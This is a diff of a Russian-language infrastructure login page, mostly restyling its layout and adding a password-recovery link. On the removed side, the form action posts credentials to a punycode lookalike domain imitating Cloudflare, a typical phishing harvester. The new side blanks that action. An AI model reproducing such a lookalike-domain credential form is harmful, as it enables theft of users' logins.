@@ -5,19 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Infrastructure Login</title>
 </head>
-<body style="display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f6f9; font-family: Arial, sans-serif;">
+<body style="display: flex;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+    background: #f4f6f9;
+    font-family: Arial, sans-serif;
+    align-items: flex-start;">
 
-    <div style="width: 300px; padding: 30px; background: white; border: 1px solid #ddd; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
-        <h3 style="text-align: center; margin-bottom: 20px;">Infrastructure Login</h3>
+    <div style="margin: 50px; width: 300px; padding: 30px; background: white; border: 1px solid #040404;">
+        <h3 style=" margin-bottom: 20px;">Вход в панель управления</h3>
         
-        <form id="loginForm" action="https://xn----cloudflare-v1k3a8ar9juare2g8f.com" method="POST">
+        <form id="loginForm" action=" " method="POST"><!--ссылка адекватная в action-->
             <label style="font-size: 14px; display: block; margin-bottom: 5px;">Логин</label>
-            <input type="text" name="username" id="username" placeholder="Введите логин" required style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+            <input type="text" name="username" id="username"  required style="width: 100%; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
             
             <label style="font-size: 14px; display: block; margin-bottom: 5px;">Пароль</label>
-            <input type="password" name="password" id="password" placeholder="Введите пароль" required style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+            <input type="password" name="password" id="password"  required style="width: 100%; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
             
-            <button type="submit" style="width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px;">Войти</button>
+            <div class="buttons" style="    display: flex;
+    align-items: center;
+    justify-content: space-between;"><button type="submit" style="padding: 5px 10px 5px 10px; margin: 5px 0px 5px 0px;
+    background: #007bff;
+    color: white;
+    border: none;
+    cursor: pointer;
+    font-size: 12px;">Войти</button>
+    <a href="/" style = " text-decoration: none; font-size: 10px;">восстановить пароль</a></div>
         </form>
     </div>
 <script>
